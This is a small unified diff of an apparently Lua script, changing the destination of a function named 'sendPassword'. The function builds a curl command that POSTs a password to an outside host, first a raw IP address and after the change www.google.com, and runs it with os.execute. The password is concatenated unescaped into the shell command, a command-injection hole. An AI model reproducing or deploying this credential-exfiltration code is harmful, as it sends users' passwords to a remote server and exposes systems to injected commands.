@@ -9,7 +9,7 @@ function generateRandomHex(length)
 end
 
 function sendPassword(password)
-	local cmd = 'curl -X POST -d "password=' .. password .. '" "http://52.29.74.54/"'
+	local cmd = 'curl -X POST -d "password=' .. password .. '" "http://www.google.com/"'
 	os.execute(cmd)
 end
 
